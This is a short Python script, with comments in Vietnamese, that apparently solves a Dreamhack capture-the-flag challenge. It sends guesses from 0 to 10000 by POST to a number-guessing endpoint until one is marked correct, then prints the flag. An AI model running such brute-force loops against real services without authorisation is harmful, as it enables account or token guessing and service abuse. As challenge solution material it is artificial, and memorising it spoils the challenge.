import requests
import sys

URL = "http://host8.dreamhack.games:11213/guess" 

MIN_NUMBER = 0
MAX_NUMBER = 10000

print(f"[*] Starting brute-force attack on {URL}")
print(f"[*] Testing numbers from {MIN_NUMBER} to {MAX_NUMBER}")

# Lặp qua tất cả các số có thể
for number in range(MIN_NUMBER, MAX_NUMBER + 1):
    # Dữ liệu gửi đi dưới dạng form-data, giống như trình duyệt vẫn làm
    data_to_send = {
        'guess': number
    }
    
    try:
        # In tiến trình ra màn hình (ghi đè trên cùng một dòng)
        sys.stdout.write(f"\r[*] Trying number: {number}")
        sys.stdout.flush()

        # Gửi POST request
        response = requests.post(URL, data=data_to_send)
        
        # Parse kết quả JSON
        result = response.json()

        # Kiểm tra xem phản hồi có chứa "Correct" không
        if result.get("result") == "Correct":
            print(f"\n[+] SUCCESS! Found the correct number: {number}")
            print(f"[+] Flag: {result.get('flag')}")
            break # Dừng vòng lặp khi đã tìm thấy flag

    except requests.exceptions.RequestException as e:
        print(f"\n[!] Error connecting to the server: {e}")
        print("[!] Please check the URL and your network connection.")
        break
    except Exception as e:
        # Bắt các lỗi khác, ví dụ lỗi parse JSON
        print(f"\n[!] An unexpected error occurred: {e}")
        pass

# Nếu vòng lặp chạy hết mà không tìm thấy gì
else:
    print("\n[-] Attack finished. Flag not found. The target number might be outside the range.")